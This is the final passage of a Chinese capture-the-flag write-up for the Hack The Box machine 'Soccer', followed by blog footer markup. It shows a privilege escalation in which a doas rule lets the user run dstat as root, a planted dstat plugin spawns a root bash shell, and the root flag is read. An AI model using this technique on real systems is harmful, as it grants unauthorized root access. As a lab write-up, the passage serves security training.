+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">player@soccer:~$ ls -la /usr/local/bin/doas<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">42224</span> Nov <span class="hljs-number">17</span>  <span class="hljs-number">2022</span> /usr/local/bin/doas<br>player@soccer:~$ find / -name doas.conf <span class="hljs-number">2</span>&gt;/dev/null<br>/usr/local/etc/doas.conf<br>player@soccer:~$ cat /usr/local/etc/doas.conf<br>permit nopass player as root cmd /usr/bin/dstat<br>player@soccer:~$ <br></code></pre></td></tr></table></figure>
+
+<p>20、dstat是一个获取系统信息的工具。查看手册页，有一个关于插件的部分说：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">player@soccer:~$ echo -e <span class="hljs-string">&#x27;import os\n\nos.system(&quot;/bin/bash&quot;)&#x27;</span> &gt; /usr/local/share/dstat/dstat_shiyan.py<br>player@soccer:~$ doas /usr/bin/dstat --shiyan<br>/usr/bin/dstat:<span class="hljs-number">2619</span>: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module<span class="hljs-number">&#x27;</span>s documentation <span class="hljs-keyword">for</span> alternative uses<br>  import imp<br>root@soccer:/home/player<span class="hljs-meta"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br>root@soccer:/home/player#<br></code></pre></td></tr></table></figure>
+
+<p>21、那获取下最终的flag信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">root@soccer:/home/player<span class="hljs-meta"># cat /root/root.txt</span><br><span class="hljs-number">6f</span>5e6092991692e12338d2858bfb1d24<br>root@soccer:/home/player# <br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/519</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Soccer-htb-writeup</div>
+      <div>https://sh1yan.top/2024/04/20/Soccer-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/04/21/Escape-htb-writeup/" title="Escape-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Escape-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/19/Busqueda-htb-writeup/" title="Busqueda-htb-writeup">
+                        <span class="hidden-mobile">Busqueda-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
